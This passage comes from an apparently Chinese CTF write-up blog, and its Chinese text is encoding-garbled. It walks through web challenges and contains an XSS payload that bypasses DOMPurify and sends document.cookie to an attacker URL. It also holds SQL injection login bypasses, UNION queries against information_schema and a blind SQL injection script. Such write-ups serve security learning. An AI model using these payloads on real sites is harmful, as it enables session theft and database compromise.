&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">setRoutes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">salt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;ok&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¬¬äºŒè¡Œä¸­ï¼Œæˆ‘ä»¬è¦&lt;code>await setRoutes&lt;/code>ï¼Œç›¸å½“äº&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">set_salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">setRoutes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">salt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;ok&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™é‡Œä¼šè¦åˆ°ä¸€ä¸ªsetRoutesçš„è¿”å›å€¼result&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">setRoutes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">index&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75715e">// redacted
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¾ˆæ²¡å¿…è¦çš„æ“ä½œï¼Œåˆä¸€ésetRoutesï¼Œçº¯å±è„±è£¤å­æ”¾å±&lt;/p>
&lt;p>å½“æˆ‘ä»¬è®¾ç½®&lt;code>salt = 'then'&lt;/code>æ—¶ï¼Œæƒ…å†µå°±ä¸ä¸€æ ·äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75715e">//redacted
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªç‰¹æ®Šçš„thenå…³é”®å­—ä¸€å‡ºæ¥ï¼Œå°±å¾ˆç‰¹æ®Šï¼Œè§£é‡Šå™¨ä¼šè¯•å›¾æŠŠå®ƒè®¤ä½œæ˜¯awaitä¸­è¦è°ƒç”¨çš„thençš„éƒ¨åˆ†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰awaitéœ€è¦å®ƒè¿™ä¸ªthenæ‰§è¡Œçš„resultæ¥ä½œä¸ºè¿”å›å€¼ï¼Œå°±å¡æ­»åœ¨è¿™é‡Œäº†ï¼Œè¿™ä¸ªsaltæ— å¤„å¯å»&lt;/p>
&lt;p>Soï¼Œ&lt;code>GET /?action=SetSalt&amp;amp;data=then&lt;/code>ä¹‹åsessionå°†æ˜¯è¿™æ ·çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#111">...&lt;/span>
&lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#111">},&lt;/span>
&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>åªè¦&lt;code>GET /?action=GetSalt&lt;/code>å³å¯ï¼Œå› ä¸º&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">route&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// route = session.salt here (just flag)
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…·ä½“æ“ä½œä¸€å¼ åŠ¨å›¾å°±èƒ½è¯´æ¸…æ¥š&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/8q7R2If.gif" alt="img">&lt;/p>
&lt;p>æœ€åï¼Œè¿™ä¸ª**çš„ä¸œè¥¿å­¦åå«&lt;a href="https://masteringjs.io/tutorials/fundamentals/thenable">Thenable Object&lt;/a>ï¼Œè°¢è°¢ä½ ï¼ŒjavascriptğŸ˜…&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://hackmd.io/@hakatashi/ryRg7oLEt">wp&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004090604105.png" alt="image-20211004090604105">&lt;/p>
&lt;h2 id="webgiita">Web/Giita&lt;/h2>
&lt;blockquote>
&lt;p>Gibson Les Paul Standard.&lt;/p>
&lt;p>Steal Cookie.&lt;/p>
&lt;/blockquote>
&lt;p>ğŸ˜­ğŸ˜­ğŸ˜­åˆæ˜¯cookie&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004082810346.png" alt="image-20211004082810346">&lt;/p>
&lt;p>çœ‹æºç ï¼Œapp.js&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004161650511.png" alt="image-20211004161650511">&lt;/p>
&lt;p>11è¡Œçš„æ­£åˆ™åŒ¹é…äº†ç©ºæ ¼ã€å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ï¼Œä½†æ˜¯å¤šä½™äº†ä¸€ä¸ª&lt;code>.&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004161816780.png" alt="image-20211004161816780">&lt;/p>
&lt;p>ä¼šæŠŠthemeæ”¾è¿›å»è¿›è¡Œä¸€ä¸ªè¿‡æ»¤&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004162229240.png" alt="image-20211004162229240">&lt;/p>
&lt;p>ç„¶åæ‹¼æ¥åˆ°stylesheet linkä¸­ï¼Œå°±å†æ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤äº†&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æ³¨å…¥åˆ°hrefè¿™é‡Œï¼Œæ¯”å¦‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#75715e">&amp;lt;!-- theme=x%20onerror%3Dalert --&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">link&lt;/span> &lt;span style="color:#75af00">rel&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;stylesheet&amp;#34;&lt;/span> &lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">x&lt;/span> &lt;span style="color:#75af00">onerror&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">alert&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¦å®Œæ•´çš„æ³¨å…¥jsä»£ç ï¼Œæˆ‘ä»¬éœ€è¦cheat DOMPurify&lt;/p>
&lt;p>DOMPurifyä¼šå…ˆ&lt;a href="https://github.com/cure53/DOMPurify/blob/main/src/purify.js#L156-L160">æ£€æµ‹å¯¹è±¡&lt;/a>åœ¨ä¸åœ¨&lt;code>DOMPurify.isSupported&lt;/code>çš„èŒƒå›´å†…&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004163456492.png" alt="image-20211004163456492">&lt;/p>
&lt;p>æ‰€ä»¥å‘¢ï¼Œæˆ‘ä»¬æŠŠå®ƒç»™å…³å’¯&lt;/p>
&lt;pre tabindex="0">&lt;code>delete document.implementation.__proto__.createHTMLDocument
&lt;/code>&lt;/pre>&lt;p>æœ€åçš„Payloadï¼ŒU+00A0(NBSP)ä¸åœ¨htmlçš„ç©ºç™½ç¬¦ä¸­ï¼Œä½†æ˜¯åœ¨Javascriptçš„ç©ºç™½ç¬¦ä¸­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#75af00">axios&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;post&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">`http://&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">/`&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;content-type&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;application/x-www-form-urlencoded&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">},&lt;/span>
&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">qs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">encode&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">theme&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;x onerror=delete\xA0document.implemenation__proto__.createHTMLDocument&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">title&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;x&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">`&amp;lt;img src=&amp;#34;x&amp;#34; onerror=&amp;#34;location.href&amp;#34;=&amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">?&amp;#39; + document.cookie&amp;gt;`&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}),&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å®Œæ•´å‚è§-&amp;gt;&lt;a href="https://hackmd.io/@hakatashi/HkgG02U4t">wp&lt;/a>&lt;/p>
&lt;hr>
&lt;p>å°±æ˜¯èœ ä¸ä¼šåš å‹‰å¼ºçœ‹çœ‹wp è¿˜ä¸ä¸€å®šçœ‹å¾—æ‡‚&lt;/p>
&lt;p>é“åºŸç‰©äº†ğŸ˜…&lt;/p></description></item><item><title>TsukuCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/13/tsuku2021-wp/</link><pubDate>Mon, 13 Sep 2021 19:15:21 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/13/tsuku2021-wp/</guid><description>&lt;p>è¿™ä¸¤å¤©åˆå¼€å§‹æœ‰ç‚¹æ‘†çƒ‚çš„è¿¹è±¡ï¼Œäºæ˜¯æŠŠå‘¨æœ«çš„ctfçœ‹çœ‹wpï¼Œæ°´ä¸€æ°´ï¼Œå¤ç°ä¸€ä¸‹&lt;/p>
&lt;p>å¦å¤–è¿™ä¸ªctfæœ€ç—›è‹¦çš„åœ°æ–¹åœ¨äºæ˜¯è‹±æ—¥å¤¹æ‚ï¼Œæˆ‘å¼€å§‹æ‡‚æ­ªæœä»åšä¸­æ–‡æ¯”èµ›é¡µé¢çš„æ—¶å€™æœ‰å¤šç—›è‹¦äº†&lt;/p>
&lt;h2 id="weblogonly">Web/logonly&lt;/h2>
&lt;p>ç»™å‡ºçš„æ˜¯ä¸€ä¸ªæœ‰214155è¡Œçš„æ—¥å¿—æ–‡ä»¶ï¼Œåªæœ‰ç¬¬214154è¡Œè¿”å›200ok&lt;/p>
&lt;p>æ˜¾ç„¶æ˜¯è¿›è¡Œäº†ä¸€ä¸ªå­—å…¸æ”»å‡»ï¼Œåœ¨ç¬¬214154æ¬¡å°è¯•æ—¶æ’å¯¹äº†ï¼Œæˆ‘ä»¬ä¸‹è½½ä¸€ä»½kalié‡Œçš„rockyou.txtä¸­çœ‹ä¸€ä¸‹214154æ˜¯ä¸ªå•¥ï¼ˆæœ‰æç¤ºç”¨åˆ°kaliè¿›è¡Œæ”»å‡»ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912171725965.png" alt="image-20210912171725965">&lt;/p>
&lt;p>&lt;code>TsukuCTF{qwertyuiop[]\\}&lt;/code>&lt;/p>
&lt;h2 id="webdigits">Web/digits&lt;/h2>
&lt;p>ä¸€ä¸ªfastapiç«™ï¼Œä½†æ˜¯è¦æ±‚ä¸æ˜¯å¾ˆé«˜çš„æ ·å­&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912174109098.png" alt="image-20210912174109098">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912174032687.png" alt="image-20210912174032687">&lt;/p>
&lt;p>åŠ å·æ”¾åˆ°urlä¸­ç›¸å½“äºåŠè§’ç©ºæ ¼&lt;/p>
&lt;p>&lt;code>TsukuCTF{you_are_lucky_Tsukushi}&lt;/code>&lt;/p>
&lt;h2 id="weblogin">Web/login&lt;/h2>
&lt;p>ç™»å½•æ¡†ï¼Œä¸‡èƒ½å¯†ç &lt;code>admin'or 1#&lt;/code>&lt;/p>
&lt;p>&lt;code>TsukuCTF{You_4r3_SUP3R_H4CKER}&lt;/code>&lt;/p>
&lt;p>ä¸€èˆ¬è¿™ç§ç®€å•çš„ç™»å½•éƒ½æ˜¯ä¸‡èƒ½å¯†ç ï¼Œä½†æ˜¯ä¹Ÿå¾—å¤šè¯•ä¸€è¯•ï¼ŒåŠ ä¸ªæ³¨é‡Šç¬¦å•Š åˆ†å·ä»€ä¹ˆçš„&lt;/p>
&lt;h2 id="weblogin2">Web/login2&lt;/h2>
&lt;p>è¯´æ˜¯ä»£ç é‡æ„è¿‡äº†&lt;/p>
&lt;p>å†ç”¨ä¸Šé¢çš„ä¸‡èƒ½å¯†ç ç™»å…¥ä¼šæ˜¾ç¤ºè¿™ä¸ªç«™çš„æ‰€æœ‰è´¦å·&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912175523340.png" alt="image-20210912175523340">&lt;/p>
&lt;p>è¯´æ˜è¿˜æ˜¯æœ‰sqliï¼Œå°è¯•ä¸€ä¸‹è”åˆæ³¨å…¥&lt;code>admin'or 1 union select null,null#&lt;/code>ï¼Œè·Ÿä¸Šé¢æ˜¯ä¸€æ ·çš„å›æ˜¾ï¼Œè¯´æ˜æœ‰ä¸¤åˆ—ï¼Œç„¶åæ˜¯æ„‰å¿«çš„æ³¨å…¥ï¼ˆæ¯ä¸€æ¬¡çš„å›æ˜¾åœ¨é¡µé¢çš„æœ«å°¾ï¼Œæ³¨æ„è¿™ä¸ªæ˜¯æœ€åˆè¦æ‰¾åˆ°å¹¶ç¡®è®¤çš„ï¼‰&lt;/p>
&lt;pre tabindex="0">&lt;code>admin'or 1 union select table_name,null from information_schema.columns#
admin'or 1 union select column_name,null from information_schema.columns where table_name='super_secret_table'#
admin'or 1 union select secret,null from super_secret_table#
&lt;/code>&lt;/pre>&lt;p>&lt;code>TsukuCTF{50_muCh_GR3AT_Hacker_!ND3ED}&lt;/code>&lt;/p>
&lt;h2 id="weblogin3">Web/login3&lt;/h2>
&lt;p>ä¾ç„¶æ˜¯å­˜åœ¨sqliï¼Œç”¨ä¸Šé¢çš„ä¸¤ä¸ªpayloadéƒ½èƒ½å›æ˜¾æ­£å¸¸ï¼Œä½†æ˜¯æ²¡æœ‰æ˜ç¡®çš„ä¿¡æ¯ï¼Œåº”è¯¥æ˜¯éœ€è¦ç›²æ³¨äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_execAnyQuery_core&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39;or ascii(substring((&lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">),&lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">,1))&amp;gt;=&lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200">;#&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;a&amp;#34;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;ã‚ˆã†ã“ã&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">page&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">low&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">low&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">mid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">low&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">_execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">low&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">low&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">_execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">char&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">char&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">end&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select version()&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">):&lt;/span>
